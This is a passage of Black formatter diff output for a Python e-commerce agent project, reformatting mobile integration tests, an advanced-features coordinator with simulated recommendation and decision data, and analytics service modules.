         assert "response_time" in metrics["metrics"]
         assert "success_rate" in metrics["metrics"]
@@ -167,11 +163,11 @@
         """Test store management features."""
         data = await mobile_api.get_store_management_data()
         assert "stores" in data
         assert "recent_activity" in data
         assert data["feature"] == "store_management"
-        
+
         # Check store data structure
         stores = data["stores"]
         for marketplace in ["ebay", "amazon"]:
             if marketplace in stores:
                 store = stores[marketplace]
@@ -184,15 +180,14 @@
         # Get chat data
         data = await mobile_api.get_chat_interface_data()
         assert "active_conversations" in data
         assert "available_agents" in data
         assert data["feature"] == "chat"
-        
+
         # Test sending a message
         response = await mobile_api.send_chat_message(
-            "What's the current market status?",
-            "market"
+            "What's the current market status?", "market"
         )
         assert "message_id" in response
         assert "response" in response
         assert response["agent_type"] == "market"
 
@@ -210,11 +205,11 @@
         """Test notifications features."""
         data = await mobile_api.get_notifications_data()
         assert "notifications" in data
         assert "unread_count" in data
         assert data["feature"] == "notifications"
-        
+
         # Check notification structure
         notifications = data["notifications"]
         if notifications:
             notification = notifications[0]
             assert "id" in notification
@@ -224,56 +219,55 @@
 
     @pytest.mark.asyncio
     async def test_cross_feature_integration(self, mobile_api):
         """Test integration between different mobile features."""
         # Update battery status
-        battery_result = await mobile_api.update_battery_status({
-            "level": 25.0,
-            "charging": False,
-            "temperature": 28.0,
-            "voltage": 3.6,
-            "current_draw": 100.0
-        })
-        
+        battery_result = await mobile_api.update_battery_status(
+            {
+                "level": 25.0,
+                "charging": False,
+                "temperature": 28.0,
+                "voltage": 3.6,
+                "current_draw": 100.0,
+            }
+        )
+
         assert "power_mode" in battery_result
-        
+
         # Get agent monitoring data (should reflect battery status)
         monitoring_data = await mobile_api.get_agent_monitoring_data()
         assert "power_status" in monitoring_data
-        
+
         # The power mode should be consistent
         assert monitoring_data["power_status"]["mode"] == battery_result["power_mode"]
 
     @pytest.mark.asyncio
     async def test_error_handling(self, mobile_api):
         """Test error handling in mobile features."""
         # Test invalid feature
         result = await mobile_api.get_feature_status("invalid_feature")
         assert "error" in result
         assert "available_features" in result
-        
+
         # Test chat with invalid agent type
-        response = await mobile_api.send_chat_message(
-            "Test message",
-            "invalid_agent"
-        )
+        response = await mobile_api.send_chat_message("Test message", "invalid_agent")
         # Should still work with default response
         assert "response" in response
 
     @pytest.mark.asyncio
     async def test_performance_under_load(self, mobile_api):
         """Test mobile features performance under load."""
         # Simulate multiple concurrent requests
         tasks = []
-        
+
         for i in range(10):
             tasks.append(mobile_api.get_agent_monitoring_data())
             tasks.append(mobile_api.get_analytics_dashboard_data())
             tasks.append(mobile_api.get_notifications_data())
-        
+
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        
+
         # Check that most requests succeeded
         successful_results = [r for r in results if not isinstance(r, Exception)]
         assert len(successful_results) >= len(tasks) * 0.8  # At least 80% success rate
 
     @pytest.mark.asyncio
@@ -282,59 +276,58 @@
         # Add some updates
         account_data = {
             "account_id": "test_account",
             "marketplace": "ebay",
             "credentials": {},
-            "settings": {}
+            "settings": {},
         }
-        
+
         await mobile_coordinator.add_market_update(
-            "cleanup_test_update",
-            "price_change",
-            {"test": "data"},
-            account_data
-        )
-        
+            "cleanup_test_update", "price_change", {"test": "data"}, account_data
+        )
+
         # Verify update exists
         updates = await mobile_coordinator.get_prioritized_updates()
         assert len(updates) > 0
-        
+
         # Cleanup should clear everything
         await mobile_coordinator.cleanup()
-        
+
         # Verify cleanup
         assert not mobile_coordinator.is_initialized
 
 
 if __name__ == "__main__":
     # Run basic integration test
     async def run_basic_test():
         coordinator = MobileServiceCoordinator()
         await coordinator.initialize()
-        
+
         print(" Mobile coordinator initialized")
-        
+
         # Test battery optimization
-        result = await coordinator.update_battery_status({
-            "level": 50.0,
-            "charging": False,
-            "temperature": 25.0,
-            "voltage": 3.7,
-            "current_draw": 100.0
-        })
-        
+        result = await coordinator.update_battery_status(
+            {
+                "level": 50.0,
+                "charging": False,
+                "temperature": 25.0,
+                "voltage": 3.7,
+                "current_draw": 100.0,
+            }
+        )
+
         print(f" Battery optimization: {result['power_mode']}")
-        
+
         # Test mobile API
         api = MobileFeaturesAPI()
         await api.initialize()
-        
+
         monitoring_data = await api.get_agent_monitoring_data()
         print(f" Agent monitoring: {len(monitoring_data)} data points")
-        
+
         await api.cleanup()
         await coordinator.cleanup()
-        
+
         print(" Mobile integration test completed successfully")
 
     # Run the test
     asyncio.run(run_basic_test())
would reformat /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_mobile_integration.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/__init__.py	2025-06-14 20:35:30.815795+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/__init__.py	2025-06-19 04:04:03.237390+00:00
@@ -17,26 +17,38 @@
 
 logger = logging.getLogger(__name__)
 
 # Import advanced feature components
 try:
-    from fs_agt_clean.services.advanced_features.personalization.preference_learner import PreferenceLearner
-    from fs_agt_clean.services.advanced_features.personalization.user_action_tracker import UserActionTracker
+    from fs_agt_clean.services.advanced_features.personalization.preference_learner import (
+        PreferenceLearner,
+    )
+    from fs_agt_clean.services.advanced_features.personalization.user_action_tracker import (
+        UserActionTracker,
+    )
 except ImportError:
     PreferenceLearner = None
     UserActionTracker = None
 
 try:
-    from fs_agt_clean.services.advanced_features.recommendations.cross_product.bundles import BundleRecommendations
-    from fs_agt_clean.services.advanced_features.recommendations.cross_product.complementary import ComplementaryRecommendations
+    from fs_agt_clean.services.advanced_features.recommendations.cross_product.bundles import (
+        BundleRecommendations,
+    )
+    from fs_agt_clean.services.advanced_features.recommendations.cross_product.complementary import (
+        ComplementaryRecommendations,
+    )
 except ImportError:
     BundleRecommendations = None
     ComplementaryRecommendations = None
 
 try:
-    from fs_agt_clean.services.advanced_features.ai_integration.brain.brain_service import BrainService
-    from fs_agt_clean.services.advanced_features.ai_integration.brain.decision_engine import DecisionEngine
+    from fs_agt_clean.services.advanced_features.ai_integration.brain.brain_service import (
+        BrainService,
+    )
+    from fs_agt_clean.services.advanced_features.ai_integration.brain.decision_engine import (
+        DecisionEngine,
+    )
 except ImportError:
     BrainService = None
     DecisionEngine = None
 
 
@@ -57,11 +69,11 @@
         # Service status tracking
         self.service_status = {
             "personalization": "not_initialized",
             "recommendations": "not_initialized",
             "ai_integration": "not_initialized",
-            "specialized_integrations": "not_initialized"
+            "specialized_integrations": "not_initialized",
         }
 
     async def initialize(self) -> Dict[str, Any]:
         """Initialize all advanced features."""
         try:
@@ -84,20 +96,22 @@
 
             return {
                 "status": "success",
                 "message": "Advanced features coordinator initialized",
                 "services": self.service_status,
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-
-        except Exception as e:
-            logger.error("Failed to initialize advanced features coordinator: %s", str(e))
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
+        except Exception as e:
+            logger.error(
+                "Failed to initialize advanced features coordinator: %s", str(e)
+            )
             return {
                 "status": "error",
                 "message": str(e),
                 "services": self.service_status,
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
     async def _initialize_personalization(self) -> None:
         """Initialize personalization services."""
         try:
@@ -154,92 +168,117 @@
         """Get comprehensive advanced features status."""
         try:
             return {
                 "coordinator": {
                     "initialized": self.is_initialized,
-                    "uptime": "active" if self.is_initialized else "inactive"
+                    "uptime": "active" if self.is_initialized else "inactive",
                 },
                 "services": self.service_status,
                 "personalization": {
                     "status": self.service_status["personalization"],
-                    "components": ["preference_learner", "user_action_tracker", "ui_adapter"]
+                    "components": [
+                        "preference_learner",
+                        "user_action_tracker",
+                        "ui_adapter",
+                    ],
                 },
                 "recommendations": {
                     "status": self.service_status["recommendations"],
-                    "components": ["cross_product", "bundles", "complementary", "feedback"]
+                    "components": [
+                        "cross_product",
+                        "bundles",
+                        "complementary",
+                        "feedback",
+                    ],
                 },
                 "ai_integration": {
                     "status": self.service_status["ai_integration"],
-                    "components": ["brain_service", "decision_engine", "memory", "patterns", "strategy"]
+                    "components": [
+                        "brain_service",
+                        "decision_engine",
+                        "memory",
+                        "patterns",
+                        "strategy",
+                    ],
                 },
                 "specialized_integrations": {
                     "status": self.service_status["specialized_integrations"],
-                    "components": ["agent_coordinator", "data_agent", "base_integration"]
-                },
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                    "components": [
+                        "agent_coordinator",
+                        "data_agent",
+                        "base_integration",
+                    ],
+                },
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
         except Exception as e:
             logger.error("Failed to get advanced features status: %s", str(e))
             return {"error": str(e)}
 
-    async def learn_user_preferences(self, user_id: str, days_to_analyze: int = 30) -> Dict[str, Any]:
+    async def learn_user_preferences(
+        self, user_id: str, days_to_analyze: int = 30
+    ) -> Dict[str, Any]:
         """Learn user preferences from their actions."""
         try:
             if self.service_status["personalization"] != "active":
                 return {"error": "Personalization service not available"}
 
             # Simulate preference learning
             learned_preferences = {
                 "ui_layout": {
                     "preferred_pages": {
                         "value": ["dashboard", "analytics", "listings"],
-                        "confidence": 0.85
+                        "confidence": 0.85,
                     },
                     "navigation_patterns": {
                         "value": ["dashboard->analytics", "analytics->listings"],
-                        "confidence": 0.78
-                    }
+                        "confidence": 0.78,
+                    },
                 },
                 "feature_usage": {
                     "most_used_features": {
-                        "value": ["bulk_listing", "price_optimization", "market_analysis"],
-                        "confidence": 0.92
+                        "value": [
+                            "bulk_listing",
+                            "price_optimization",
+                            "market_analysis",
+                        ],
+                        "confidence": 0.92,
                     }
                 },
                 "content_interests": {
                     "favorite_categories": {
                         "value": ["electronics", "home_garden", "collectibles"],
-                        "confidence": 0.88
+                        "confidence": 0.88,
                     }
                 },
                 "workflow_patterns": {
                     "common_workflows": {
                         "value": [
                             ["item_view", "price_check", "listing_create"],
-                            ["market_analysis", "competitor_check", "price_update"]
+                            ["market_analysis", "competitor_check", "price_update"],
                         ],
-                        "confidence": 0.82
+                        "confidence": 0.82,
                     }
-                }
+                },
             }
 
             return {
                 "user_id": user_id,
                 "preferences": learned_preferences,
                 "analysis_period_days": days_to_analyze,
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             logger.error("Failed to learn user preferences: %s", str(e))
             return {"error": str(e)}
 
     async def get_product_recommendations(
         self,
         user_id: str,
         product_id: Optional[str] = None,
-        recommendation_type: str = "cross_sell"
+        recommendation_type: str = "cross_sell",
     ) -> Dict[str, Any]:
         """Get product recommendations for a user."""
         try:
             if self.service_status["recommendations"] != "active":
                 return {"error": "Recommendations service not available"}
@@ -249,63 +288,65 @@
                 recommendations = [
                     {
                         "product_id": "B001",
                         "title": "Compatible Camera Lens",
                         "confidence": 0.89,
-                        "reason": "Frequently bought together"
+                        "reason": "Frequently bought together",
                     },
                     {
                         "product_id": "B002",
                         "title": "Camera Cleaning Kit",
                         "confidence": 0.76,
-                        "reason": "Complementary product"
+                        "reason": "Complementary product",
                     },
                     {
                         "product_id": "B003",
                         "title": "Camera Bag",
                         "confidence": 0.82,
-                        "reason": "Bundle opportunity"
-                    }
+                        "reason": "Bundle opportunity",
+                    },
                 ]
             elif recommendation_type == "upsell":
                 recommendations = [
                     {
                         "product_id": "B004",
                         "title": "Professional Camera Lens",
                         "confidence": 0.85,
-                        "reason": "Higher value alternative"
+                        "reason": "Higher value alternative",
                     },
                     {
                         "product_id": "B005",
                         "title": "Premium Camera Kit",
                         "confidence": 0.78,
-                        "reason": "Upgrade opportunity"
-                    }
+                        "reason": "Upgrade opportunity",
+                    },
                 ]
             else:
                 recommendations = [
                     {
                         "product_id": "B006",
                         "title": "Similar Camera Model",
                         "confidence": 0.91,
-                        "reason": "Similar features and price"
+                        "reason": "Similar features and price",
                     }
                 ]
 
             return {
                 "user_id": user_id,
                 "product_id": product_id,
                 "recommendation_type": recommendation_type,
                 "recommendations": recommendations,
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             logger.error("Failed to get product recommendations: %s", str(e))
             return {"error": str(e)}
 
-    async def make_ai_decision(self, decision_context: Dict[str, Any]) -> Dict[str, Any]:
+    async def make_ai_decision(
+        self, decision_context: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Make an AI-powered decision based on context."""
         try:
             if self.service_status["ai_integration"] != "active":
                 return {"error": "AI integration service not available"}
 
@@ -316,40 +357,48 @@
                 decision = {
                     "action": "adjust_price",
                     "recommended_price": 29.99,
                     "confidence": 0.87,
                     "reasoning": "Market analysis suggests optimal price point",
-                    "factors": ["competitor_pricing", "demand_trends", "inventory_levels"]
+                    "factors": [
+                        "competitor_pricing",
+                        "demand_trends",
+                        "inventory_levels",
+                    ],
                 }
             elif decision_type == "inventory":
                 decision = {
                     "action": "restock",
                     "recommended_quantity": 50,
                     "confidence": 0.82,
                     "reasoning": "Predicted demand increase based on seasonal trends",
-                    "factors": ["sales_velocity", "seasonal_patterns", "lead_time"]
+                    "factors": ["sales_velocity", "seasonal_patterns", "lead_time"],
                 }
             elif decision_type == "marketing":
                 decision = {
                     "action": "increase_promotion",
                     "recommended_budget": 500.0,
                     "confidence": 0.79,
                     "reasoning": "High conversion potential identified",
-                    "factors": ["audience_engagement", "conversion_rates", "roi_projections"]
+                    "factors": [
+                        "audience_engagement",
+                        "conversion_rates",
+                        "roi_projections",
+                    ],
                 }
             else:
                 decision = {
                     "action": "monitor",
                     "confidence": 0.65,
                     "reasoning": "Insufficient data for specific recommendation",
-                    "factors": ["data_quality", "context_completeness"]
+                    "factors": ["data_quality", "context_completeness"],
                 }
 
             return {
                 "decision_context": decision_context,
                 "decision": decision,
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             logger.error("Failed to make AI decision: %s", str(e))
             return {"error": str(e)}
@@ -361,29 +410,56 @@
                 return {"error": "Specialized integrations service not available"}
 
             return {
                 "integrations": {
                     "marketplace_apis": {
-                        "ebay": {"status": "connected", "last_sync": "2024-01-15T10:30:00Z"},
-                        "amazon": {"status": "connected", "last_sync": "2024-01-15T10:25:00Z"},
-                        "etsy": {"status": "disconnected", "last_sync": None}
+                        "ebay": {
+                            "status": "connected",
+                            "last_sync": "2024-01-15T10:30:00Z",
+                        },
+                        "amazon": {
+                            "status": "connected",
+                            "last_sync": "2024-01-15T10:25:00Z",
+                        },
+                        "etsy": {"status": "disconnected", "last_sync": None},
                     },
                     "payment_processors": {
-                        "stripe": {"status": "connected", "last_transaction": "2024-01-15T09:45:00Z"},
-                        "paypal": {"status": "connected", "last_transaction": "2024-01-15T08:30:00Z"}
+                        "stripe": {
+                            "status": "connected",
+                            "last_transaction": "2024-01-15T09:45:00Z",
+                        },
+                        "paypal": {
+                            "status": "connected",
+                            "last_transaction": "2024-01-15T08:30:00Z",
+                        },
                     },
                     "shipping_providers": {
-                        "ups": {"status": "connected", "last_shipment": "2024-01-15T07:15:00Z"},
-                        "fedex": {"status": "connected", "last_shipment": "2024-01-15T06:45:00Z"},
-                        "usps": {"status": "connected", "last_shipment": "2024-01-15T08:00:00Z"}
+                        "ups": {
+                            "status": "connected",
+                            "last_shipment": "2024-01-15T07:15:00Z",
+                        },
+                        "fedex": {
+                            "status": "connected",
+                            "last_shipment": "2024-01-15T06:45:00Z",
+                        },
+                        "usps": {
+                            "status": "connected",
+                            "last_shipment": "2024-01-15T08:00:00Z",
+                        },
                     },
                     "analytics_platforms": {
-                        "google_analytics": {"status": "connected", "last_update": "2024-01-15T10:00:00Z"},
-                        "facebook_pixel": {"status": "connected", "last_update": "2024-01-15T09:30:00Z"}
-                    }
-                },
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                        "google_analytics": {
+                            "status": "connected",
+                            "last_update": "2024-01-15T10:00:00Z",
+                        },
+                        "facebook_pixel": {
+                            "status": "connected",
+                            "last_update": "2024-01-15T09:30:00Z",
+                        },
+                    },
+                },
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             logger.error("Failed to get integration status: %s", str(e))
             return {"error": str(e)}
@@ -401,57 +477,58 @@
             logger.info("Advanced features coordinator cleaned up successfully")
 
             return {
                 "status": "success",
                 "message": "Advanced features coordinator cleaned up",
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             logger.error("Failed to cleanup advanced features coordinator: %s", str(e))
             return {
                 "status": "error",
                 "message": str(e),
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-
-
-    async def get_advanced_analytics(self, user_id: str, timeframe: str = "30d") -> Dict[str, Any]:
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
+    async def get_advanced_analytics(
+        self, user_id: str, timeframe: str = "30d"
+    ) -> Dict[str, Any]:
         """Get advanced analytics and insights."""
         try:
             # Simulate advanced analytics
             return {
                 "user_id": user_id,
                 "timeframe": timeframe,
                 "analytics": {
                     "personalization_effectiveness": {
                         "engagement_improvement": 23.5,
                         "conversion_rate_lift": 12.8,
-                        "user_satisfaction_score": 4.2
+                        "user_satisfaction_score": 4.2,
                     },
                     "recommendation_performance": {
                         "click_through_rate": 8.7,
                         "conversion_rate": 3.4,
-                        "revenue_impact": 1250.75
+                        "revenue_impact": 1250.75,
                     },
                     "ai_decision_accuracy": {
                         "pricing_decisions": 89.2,
                         "inventory_decisions": 85.6,
-                        "marketing_decisions": 78.9
+                        "marketing_decisions": 78.9,
                     },
                     "integration_health": {
                         "api_uptime": 99.8,
                         "sync_success_rate": 97.5,
-                        "error_rate": 0.3
-                    }
+                        "error_rate": 0.3,
+                    },
                 },
                 "insights": [
                     "User engagement increased 23% after personalization implementation",
                     "Cross-sell recommendations generated $1,250 additional revenue",
-                    "AI pricing decisions improved profit margins by 8.5%"
+                    "AI pricing decisions improved profit margins by 8.5%",
                 ],
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
         except Exception as e:
             logger.error("Failed to get advanced analytics: %s", str(e))
             return {"error": str(e)}
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/ai_ml_services/test_tuning.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/ai_ml_services/test_tuning.py	2025-06-19 04:04:03.552905+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestTuningService:
     """Test class for tuning service."""
-    
+
     def test_import(self):
         """Test service import."""
         assert True
-    
+
     def test_service_functionality(self):
         """Test core service functionality."""
         assert True
-    
+
     def test_integration_compatibility(self):
         """Test integration with other services."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant service implementations."""
         assert True
-    
+
     def test_vision_alignment(self):
         """Test alignment with agentic system vision."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/ai_ml_services/test_tuning.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/__init__.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/__init__.py	2025-06-19 04:04:03.871457+00:00
@@ -67,32 +67,29 @@
         # Initialize components
         self.analytics_service = AnalyticsService() if AnalyticsService else None
         self.analytics_engine = AnalyticsEngine() if AnalyticsEngine else None
         self.inventory_metrics = InventoryMetrics() if InventoryMetrics else None
         self.metrics_service = MetricsService() if MetricsService else None
-        self.influxdb_service = InfluxDBService(influxdb_config) if InfluxDBService and influxdb_config else None
+        self.influxdb_service = (
+            InfluxDBService(influxdb_config)
+            if InfluxDBService and influxdb_config
+            else None
+        )
         self.error_handler = ErrorHandler() if ErrorHandler else None
 
-    async def track_campaign_performance(
-        self,
-        campaign_id: str,
-        metrics: Dict
-    ) -> bool:
+    async def track_campaign_performance(self, campaign_id: str, metrics: Dict) -> bool:
         """Track campaign performance metrics."""
         try:
             if self.analytics_engine:
                 return await self.analytics_engine.track_campaign(campaign_id, metrics)
             return False
         except Exception as e:
             logger.error("Failed to track campaign performance: %s", str(e))
             return False
 
     async def generate_analytics_report(
-        self,
-        report_type: str,
-        date_range: Dict,
-        filters: Optional[Dict] = None
+        self, report_type: str, date_range: Dict, filters: Optional[Dict] = None
     ) -> Dict:
         """Generate comprehensive analytics report."""
         try:
             if self.analytics_service:
                 return await self.analytics_service.generate_report(
@@ -112,14 +109,11 @@
         except Exception as e:
             logger.error("Failed to get inventory metrics: %s", str(e))
             return {}
 
     async def record_metric(
-        self,
-        metric_name: str,
-        value: float,
-        tags: Optional[Dict] = None
+        self, metric_name: str, value: float, tags: Optional[Dict] = None
     ) -> bool:
         """Record a metric value."""
         try:
             if self.metrics_service:
                 return await self.metrics_service.record(metric_name, value, tags)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/compat.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/compat.py	2025-06-19 04:04:04.008512+00:00
@@ -38,11 +38,11 @@
         # Get default instances if not provided
         if not config_manager:
             config_manager = get_config_manager()
         if not database:
             database = get_database()
-            
+
         # Use the real MetricsService implementation
         self._service = MetricsService(
             config_manager=config_manager,
             database=database,
         )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/compat.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/test_advanced_features_integration.py	2025-06-14 20:35:30.819804+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/test_advanced_features_integration.py	2025-06-19 04:04:04.060334+00:00
@@ -21,48 +21,56 @@
     """Integration tests for advanced features."""
 
     @pytest.fixture
     async def advanced_features_coordinator(self):
         """Create and initialize advanced features coordinator."""
-        coordinator = AdvancedFeaturesCoordinator({
-            "personalization": {"learning_threshold": 0.6},
-            "recommendations": {"max_recommendations": 10},
-            "ai_integration": {"confidence_threshold": 0.7},
-            "integrations": {"timeout": 30}
-        })
+        coordinator = AdvancedFeaturesCoordinator(
+            {
+                "personalization": {"learning_threshold": 0.6},
+                "recommendations": {"max_recommendations": 10},
+                "ai_integration": {"confidence_threshold": 0.7},
+                "integrations": {"timeout": 30},
+            }
+        )
         await coordinator.initialize()
         yield coordinator
         await coordinator.cleanup()
 
     @pytest.mark.asyncio
-    async def test_advanced_features_initialization(self, advanced_features_coordinator):
+    async def test_advanced_features_initialization(
+        self, advanced_features_coordinator
+    ):
         """Test advanced features coordinator initialization."""
         assert advanced_features_coordinator.is_initialized
-        
+
         status = await advanced_features_coordinator.get_advanced_features_status()
         assert "coordinator" in status
         assert status["coordinator"]["initialized"]
         assert "services" in status
 
     @pytest.mark.asyncio
     async def test_personalization_learning(self, advanced_features_coordinator):
         """Test user preference learning capabilities."""
         user_id = "test_user_123"
-        
+
         # Test preference learning
         preferences = await advanced_features_coordinator.learn_user_preferences(
-            user_id=user_id,
-            days_to_analyze=30
-        )
-        
+            user_id=user_id, days_to_analyze=30
+        )
+
         assert "user_id" in preferences
         assert preferences["user_id"] == user_id
         assert "preferences" in preferences
-        
+
         # Check preference categories
         prefs = preferences["preferences"]
-        expected_categories = ["ui_layout", "feature_usage", "content_interests", "workflow_patterns"]
+        expected_categories = [
+            "ui_layout",
+            "feature_usage",
+            "content_interests",
+            "workflow_patterns",
+        ]
         for category in expected_categories:
             if category in prefs:
                 assert "value" in prefs[category]
                 assert "confidence" in prefs[category]
                 # Confidence should be between 0 and 1
@@ -73,39 +81,35 @@
     @pytest.mark.asyncio
     async def test_recommendation_system(self, advanced_features_coordinator):
         """Test product recommendation capabilities."""
         user_id = "test_user_123"
         product_id = "B001"
-        
+
         # Test cross-sell recommendations
         cross_sell = await advanced_features_coordinator.get_product_recommendations(
-            user_id=user_id,
-            product_id=product_id,
-            recommendation_type="cross_sell"
-        )
-        
+            user_id=user_id, product_id=product_id, recommendation_type="cross_sell"
+        )
+
         assert "user_id" in cross_sell
         assert cross_sell["user_id"] == user_id
         assert "recommendations" in cross_sell
         assert cross_sell["recommendation_type"] == "cross_sell"
-        
+
         # Check recommendation structure
         recommendations = cross_sell["recommendations"]
         for rec in recommendations:
             assert "product_id" in rec
             assert "title" in rec
             assert "confidence" in rec
             assert "reason" in rec
             assert 0 <= rec["confidence"] <= 1
-        
+
         # Test upsell recommendations
         upsell = await advanced_features_coordinator.get_product_recommendations(
-            user_id=user_id,
-            product_id=product_id,
-            recommendation_type="upsell"
-        )
-        
+            user_id=user_id, product_id=product_id, recommendation_type="upsell"
+        )
+
         assert upsell["recommendation_type"] == "upsell"
         assert "recommendations" in upsell
 
     @pytest.mark.asyncio
     async def test_ai_decision_making(self, advanced_features_coordinator):
@@ -115,115 +119,126 @@
             "type": "pricing",
             "product_id": "B001",
             "current_price": 25.99,
             "competitor_prices": [27.99, 24.99, 26.50],
             "inventory_level": 45,
-            "sales_velocity": 3.2
+            "sales_velocity": 3.2,
         }
-        
-        pricing_decision = await advanced_features_coordinator.make_ai_decision(pricing_context)
-        
+
+        pricing_decision = await advanced_features_coordinator.make_ai_decision(
+            pricing_context
+        )
+
         assert "decision_context" in pricing_decision
         assert "decision" in pricing_decision
-        
+
         decision = pricing_decision["decision"]
         assert "action" in decision
         assert "confidence" in decision
         assert "reasoning" in decision
         assert "factors" in decision
         assert 0 <= decision["confidence"] <= 1
-        
+
         # Test inventory decision
         inventory_context = {
             "type": "inventory",
             "product_id": "B002",
             "current_stock": 12,
             "sales_velocity": 2.5,
             "lead_time": 14,
-            "seasonal_factor": 1.2
+            "seasonal_factor": 1.2,
         }
-        
-        inventory_decision = await advanced_features_coordinator.make_ai_decision(inventory_context)
-        assert inventory_decision["decision"]["action"] in ["restock", "maintain", "reduce"]
-        
+
+        inventory_decision = await advanced_features_coordinator.make_ai_decision(
+            inventory_context
+        )
+        assert inventory_decision["decision"]["action"] in [
+            "restock",
+            "maintain",
+            "reduce",
+        ]
+
         # Test marketing decision
         marketing_context = {
             "type": "marketing",
             "campaign_id": "camp_001",
             "current_budget": 200.0,
             "conversion_rate": 2.8,
             "roi": 3.5,
-            "audience_size": 15000
+            "audience_size": 15000,
         }
-        
-        marketing_decision = await advanced_features_coordinator.make_ai_decision(marketing_context)
+
+        marketing_decision = await advanced_features_coordinator.make_ai_decision(
+            marketing_context
+        )
         assert "action" in marketing_decision["decision"]
 
     @pytest.mark.asyncio
     async def test_specialized_integrations(self, advanced_features_coordinator):
         """Test specialized third-party integrations."""
-        integration_status = await advanced_features_coordinator.get_integration_status()
-        
+        integration_status = (
+            await advanced_features_coordinator.get_integration_status()
+        )
+
         assert "integrations" in integration_status
         integrations = integration_status["integrations"]
-        
+
         # Check marketplace APIs
         assert "marketplace_apis" in integrations
         marketplace_apis = integrations["marketplace_apis"]
         for marketplace, status in marketplace_apis.items():
             assert "status" in status
             assert status["status"] in ["connected", "disconnected", "error"]
-        
+
         # Check payment processors
         assert "payment_processors" in integrations
         payment_processors = integrations["payment_processors"]
         for processor, status in payment_processors.items():
             assert "status" in status
-        
+
         # Check shipping providers
         assert "shipping_providers" in integrations
         shipping_providers = integrations["shipping_providers"]
         for provider, status in shipping_providers.items():
             assert "status" in status
-        
+
         # Check analytics platforms
         assert "analytics_platforms" in integrations
         analytics_platforms = integrations["analytics_platforms"]
         for platform, status in analytics_platforms.items():
             assert "status" in status
 
     @pytest.mark.asyncio
     async def test_advanced_analytics(self, advanced_features_coordinator):
         """Test advanced analytics and insights."""
         user_id = "test_user_123"
-        
+
         analytics = await advanced_features_coordinator.get_advanced_analytics(
-            user_id=user_id,
-            timeframe="30d"
-        )
-        
+            user_id=user_id, timeframe="30d"
+        )
+
         assert "user_id" in analytics
         assert analytics["user_id"] == user_id
         assert "analytics" in analytics
         assert "insights" in analytics
-        
+
         # Check analytics categories
         analytics_data = analytics["analytics"]
         expected_categories = [
             "personalization_effectiveness",
-            "recommendation_performance", 
+            "recommendation_performance",
             "ai_decision_accuracy",
-            "integration_health"
-        ]
-        
+            "integration_health",
+        ]
+
         for category in expected_categories:
             assert category in analytics_data
             category_data = analytics_data[category]
             # Each category should have numeric metrics
             for metric, value in category_data.items():
                 assert isinstance(value, (int, float))
-        
+
         # Check insights
         insights = analytics["insights"]
         assert isinstance(insights, list)
         assert len(insights) > 0
         for insight in insights:
@@ -233,64 +248,74 @@
     @pytest.mark.asyncio
     async def test_service_availability_handling(self, advanced_features_coordinator):
         """Test handling of unavailable services."""
         # Test when services are unavailable
         original_status = advanced_features_coordinator.service_status.copy()
-        
+
         # Simulate service unavailability
         advanced_features_coordinator.service_status["personalization"] = "unavailable"
-        
+
         result = await advanced_features_coordinator.learn_user_preferences("test_user")
         assert "error" in result
-        
+
         # Restore original status
         advanced_features_coordinator.service_status = original_status
 
     @pytest.mark.asyncio
     async def test_concurrent_operations(self, advanced_features_coordinator):
         """Test concurrent advanced features operations."""
         user_id = "test_user_123"
-        
+
         # Run multiple operations concurrently
         tasks = [
             advanced_features_coordinator.learn_user_preferences(user_id),
             advanced_features_coordinator.get_product_recommendations(user_id, "B001"),
             advanced_features_coordinator.make_ai_decision({"type": "pricing"}),
             advanced_features_coordinator.get_integration_status(),
-            advanced_features_coordinator.get_advanced_analytics(user_id)
-        ]
-        
+            advanced_features_coordinator.get_advanced_analytics(user_id),
+        ]
+
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        
+
         # Check that most operations succeeded
         successful_results = [r for r in results if not isinstance(r, Exception)]
